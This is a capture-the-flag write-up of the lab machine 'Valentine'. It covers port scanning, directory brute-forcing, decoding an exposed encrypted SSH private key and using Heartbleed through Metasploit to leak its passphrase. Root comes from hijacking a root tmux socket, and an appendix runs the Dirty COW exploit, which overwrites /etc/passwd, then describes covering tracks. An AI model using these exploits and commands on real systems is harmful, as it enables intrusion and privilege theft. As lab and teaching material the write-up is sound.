# MACHINE CHALLENGE: VALENTINE

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.79
OS: Linux
```

### PORTSCANNING w/ NMAP

Use `nmap` to see if we can detect what services our host is offering, what
operating system (and version) our host is running, what type of packet
filters/firewalls are in use, etc.

```
$ sudo nmap -A -sS -T4 10.10.10.79
Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-09 18:02 EDT
Nmap scan report for 10.10.10.79
Host is up (0.42s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-07-09T22:03:30+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

So we have SSH(22), HTTP(80) and HTTPS(443).

### ENUMERATING PORT 80 (HTTP)

Visiting the webpage we see a graphic `omg.jpg` which appears to indicate
something about the `heartbleed` attack.

<img src="port-80.jpg" width=500px/>

```
https://en.wikipedia.org/wiki/Heartbleed

Heartbleed is a security bug in the OpenSSL cryptography library, which is a
widely used implementation of the Transport Layer Security (TLS) protocol. It
was introduced into the software in 2012 and publicly disclosed in April 2014.
Heartbleed may be exploited regardless of whether the vulnerable OpenSSL
instance is running as a TLS server or client. It results from improper input
validation (due to a missing bounds check) in the implementation of the TLS
heartbeat extension, thus the bug's name derives from heartbeat. The
vulnerability is classified as a buffer over-read, a situation where more data
can be read than should be allowed.
```

Attempting to enumerate through directory bruteforcing using
`gobuster`..

```
$ gobuster -e -u 10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.79/index (Status: 200)
http://10.10.10.79/dev (Status: 301)
http://10.10.10.79/encode (Status: 200)
http://10.10.10.79/decode (Status: 200)
http://10.10.10.79/omg (Status: 200)
```

Enumerating we find there is an `encode/` and a `decode/` page.

<img src="port-80_encode.png" width=250px/>

Trying out the text `hello` as the input to the encoding appears to
yield a base64 encoded string..

<img src="port-80_encode_hello.png" width=250px/>

.. which we validate to be the case.

```
$ echo "aGVsbG8=" | base64 -D
hello
```

As well, we find two interesting files under `dev/`..

<img src="port-80_dev.jpg" width=500px/>

The file `notes.txt` seems to be a clue that this has something to do
with encoding and decoding and possibly a problem with this being done
on the server-side.

```
$ cat notes.txt 
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

The other file `hype_key` seems to be a hexadecimal string. Converting
from hex-to-ascii gives us what appears to be a RSA private key?

```
$ xxd -r -p hype_key > rsa_priv_key.txt
$ cat rsa_priv_key.txt
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

### HEARTBLEED

```
https://xkcd.com/1354/
```

Let's confirm whether the system has the heartbleed vulnerability..

```
$ nmap -sV -script=ssl-heartbleed 10.10.10.79

Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-11 17:44 EDT
Nmap scan report for 10.10.10.79
Host is up (0.46s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.17 seconds
```

```
https://blog.rapid7.com/2014/04/09/metasploits-heartbleed-scanner-module-cve-2014-0160/
```

```
$ msfconsole
msf > use auxiliary/scanner/ssl/openssl_heartbleed
msf auxiliary(openssl_heartbleed) > set RHOSTS 10.10.10.79
RHOSTS => 10.10.10.79
msf auxiliary(openssl_heartbleed) > set RPORT 443
RPORT => 443
msf auxiliary(openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf auxiliary(openssl_heartbleed) > run
[*] 10.10.10.79:443       - Sending Client Hello...
[*] 10.10.10.79:443       - Sending Heartbeat...
[*] 10.10.10.79:443       - Heartbeat response, 65535 bytes
[+] 10.10.10.79:443       - Heartbeat response with leak
[*] 10.10.10.79:443       - Printable info leaked:
```

Running several times and cycling through what appears to be random, useless
data.. eventually found the following strings that might mean something..

```
valentine.htb1.0...U....valentine.htb0...180206004525Z..190206004525Z0J1.0
```
```
...b9597dc55b21a2759b480fb102f9999a..
```
```
..ux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.....e's*...>..;:K..
```

The last data fragment is interesting as it appears to be a fragment of an HTTP
request to decode.php which we came across earlier in our HTTP enumeration.
Since we determined that the decode/encode process was using base64, let's see
what the "$text=" parameter is..

```
$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

Interesting.. maybe a password?

### OWN USER

##### SSH

Going back to the RSA private key that we found under `dev/hype_key` and
observing that SSH was enabled on the machine, let's see if we can use that
to `ssh` in? (making the guess that the user name is `hype` given the key was
called `hype_key`. (When we try to ssh in, we discover a passphrase is required
for the RSA private key.. which we try the string we found exploiting the
heartbleed vulnerability).

```
$ chmod 600 rsa_priv_key.txt
$ ssh -i rsa_priv_key.txt hype@10.10.10.79
Enter passphrase for key 'rsa_priv_key.txt': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Thu Jul 12 06:15:37 2018 from 10.10.15.23
hype@Valentine:~$
```

We are in! Now let's look for the user flag..

```
hype@Valentine:~$ pwd
/home/hype
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ find . -name user.txt
./Desktop/user.txt
```

### OWN MACHINE

```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

##### INFO GATHERING

What OS are we dealing with here?

```
$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
```
hype@Valentine:/$ cat /proc/version
Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012
hype@Valentine:/$ cat /etc/issue
Ubuntu 12.04 LTS \n \l
```

That's a pretty outdate OS and kernel..


##### LINUX ENUM

Now that we have a session on the machine, let's bring over our Linux Enum
script and see what it might find for us..

```
hype@Valentine:~$ scp fortyfunbobby@10.10.16.53:/tmp/LinEnum.sh .
fortyfunbobby@10.10.16.53's password: 
LinEnum.sh     
hype@Valentine:~/Downloads$ chmod +x LinEnum.sh 
hype@Valentine:~/Downloads$ ./LinEnum.sh -r LinEnum.out

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# 

Debug Info
thorough tests = disabled


Scan started at:
Thu Jul 12 07:43:19 PDT 2018


### SYSTEM ##############################################
Kernel information:
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux


Kernel information (continued):
Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012


Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"


Hostname:
Valentine

<...>
```

Didn't see anything interesting in the output that jumps out except for maybe
this process that is running on the system that is taking in a weird directory
as a parameter..

```
root       1021  0.0  0.1  26416  1684 ?        Ss   08:07   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

Let's go check out what that directory is..

```
hype@Valentine:~$ ls -la /
total 108
drwxr-xr-x  26 root root  4096 Feb  6 11:56 .
drwxr-xr-x  26 root root  4096 Feb  6 11:56 ..
drwxr-xr-x   2 root root  4096 Dec 11  2017 bin
drwxr-xr-x   3 root root  4096 Feb 16 14:41 boot
drwxr-xr-x   2 root root  4096 Dec 11  2017 cdrom
drwxr-xr-x  13 root root  4060 Jul 13 11:58 dev
drwxr-xr-x   2 root root  4096 Dec 13  2017 devs
drwxr-xr-x   2 root hype  4096 Jul 13 11:58 .devs
drwxr-xr-x 132 root root 12288 Jul 13 12:16 etc
drwxr-xr-x   3 root root  4096 Dec 11  2017 home
hype@Valentine:~$ ls -l /.devs/dev_sess 
srwxrwx--- 1 root hype 0 Jul 13 11:58 /.devs/dev_sess
```

Weird to have a file that is owned by `root` by access to group `hype`??
Checking what else is running on the system that references `dev_sess` we find
references to `tmux`..

```
hype@Valentine:~$ ps -ef | grep tmux
root       1034      1  0 13:43 ?        00:00:01 /usr/bin/tmux -S /.devs/dev_sess
hype       8592      1  0 14:17 ?        00:00:00 tmux
hype       8706   3045  0 14:17 pts/7    00:00:00 grep --color=auto tmux
```

Loading the `man` page for `tmux` we find it is a terminal multiplexer that
allows for detaching and reattaching to sessions? Hm.. and `root` is running
`tmux` with `-S /.devs/dev_sess` which specifies the server socket it is using..

```
hype@Valentine:~$ man tmux
TMUX(1)                   BSD General Commands Manual                  TMUX(1)

NAME
     tmux — terminal multiplexer

SYNOPSIS
     tmux [-28lquvV] [-c shell-command] [-f file] [-L socket-name]
          [-S socket-path] [command [flags]]

DESCRIPTION
     tmux is a terminal multiplexer: it enables a number of terminals to be
     created, accessed, and controlled from a single screen.  tmux may be
     detached from a screen and continue running in the background, then later
     reattached.

<...>

     -S socket-path
                   Specify a full alternative path to the server socket.  If
                   -S is specified, the default socket directory is not used
                   and any -L flag is ignored.
```

Going back to the LinEnum output, we also see that it is listed as a valid
login shell..

```
Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
```

If we think back on the theme of this box, we discovered a `notes.txt` file
which seemed to indicate a todo list for the developer which had an indication
that he needed to come back later and fix the decoding and encoding.. perhaps
that meant he has a session which he has running and detached from which we
can attach to? We have the `socket-path` that `root` is using (/.devs/dev_sess),so let's see what we can do with it..

```
hype@Valentine:~$ /usr/bin/tmux -S /.devs/dev_sess list-sessions
0: 1 windows (created Mon Jul 16 13:43:03 2018) [80x24]
```

Seems like there is a single unattached session, so let's try to attach to it!

```
hype@Valentine:~$ /usr/bin/tmux -S /.devs/dev_sess attach
root@Valentine:/#
```

Whoa.. root shell! Now onto the flag..

```
root@Valentine:# cd /root
root@Valentine:~# ls
curl.sh  root.txt
```

Out of curiousity, went to go take a look at the `.bash_history` file of `hype`
and saw there were clues there as well of what amounted to what `hype` was doing
as he/she was doing before taking a coffee break.....

```
hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

### APPENDIX

There was discussion in various forums appearing to reference the Linux "Dirty
Cow" exploit as also a means for priviledge escalation against this version of
the Linux OS. That would be interesting to also try out.

```
https://infosecuritygeek.com/hackthebox-valentine/
```

##### DIRTY COW

```
DirtyCOW bug is a race condition in the Linux kernel’s memory subsystem which
handles the copy-on-write (COW) breakage of private read-only memory mappings.
By exploiting this bug, an unprivileged local user could use this flaw to gain
write access to otherwise read-only memory mappings, thus increasing their
privileges on the system.

https://dirtycow.ninja/
```

So let's see what we can find out about attempting this exploit..

```
$ searchsploit dirty cow
--------------------------------------------- ----------------------------------
 Exploit Title                               |  Path
                                             | (/usr/share/exploitdb/platforms/)
--------------------------------------------- ----------------------------------
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRAC | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRAC | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /pro | linux/local/40611.c
--------------------------------------------- ----------------------------------
$ cp /usr/share/exploitdb/platforms/linux/local/40839.c .
```

Let's try using `netcat` to transfer the file over to the victim machine (noting
that our own ip address is `10.10.16.55`)..

```
$ sudo ifconfig
[sudo] password for fortyfunbobby: 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::a00:27ff:febe:c78  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:be:0c:78  txqueuelen 1000  (Ethernet)
        RX packets 129979  bytes 45471913 (43.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 92333  bytes 13950652 (13.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 922  bytes 46438 (45.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 922  bytes 46438 (45.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.55  netmask 255.255.254.0  destination 10.10.16.55
        inet6 fe80::6e8f:e4b1:ed7e:faf3  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:4::1035  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 126  bytes 14162 (13.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213  bytes 17812 (17.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
$ nc -nlvp 1337 < 40839.c
listening on [any] 1337 ...
```

```
hype@Valentine:~/Downloads$ nc 10.10.16.55 1337 > 40839.c
hype@Valentine:~/Downloads$ ls -l
total 8
-rw-rw-r-- 1 hype hype 5006 Jul 17 09:01 40839.c
```

Now we need to compile the exploit source code to execute it.

For the particular implementation of DirtyCow exploit we used, it automatically
generates a new passwd file containing a new user “firefart” which overwrites
the root account. After running the exploit we should be able to login with the
newly created user with a password that we specify on a prompt. The original
/etc/passwd file is then backed up to /tmp/passwd.bak.

```
hype@Valentine:~/Downloads$ head -25 40839.c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
hype@Valentine:~/Downloads$ gcc -pthread 40839.c -o dirty -lcrypt
```

Now let's try running our exploit!

```
hype@Valentine:~/Downloads$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash

mmap: 7fa120048000
hype@Valentine:~/Downloads$ head /etc/passwd
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
hype@Valentine:~/Downloads$ su firefart
Password: 
firefart@Valentine:/home/hype/Downloads# ls -l /root
total 8
-rwxr-xr-x 1 firefart root 388 Dec 13  2017 curl.sh
-rw-r--r-- 1 firefart root  33 Dec 13  2017 root.txt
```

Cool!  Let's cover up our tracks..

```
firefart@Valentine:/home/hype/Downloads# cd /etc
firefart@Valentine:/etc# ls -l passwd*
-rw-r--r-- 1 firefart root 1711 Dec 11  2017 passwd
-rw------- 1 firefart root 1711 Dec 11  2017 passwd-
firefart@Valentine:/etc# mv passwd- passwd
```
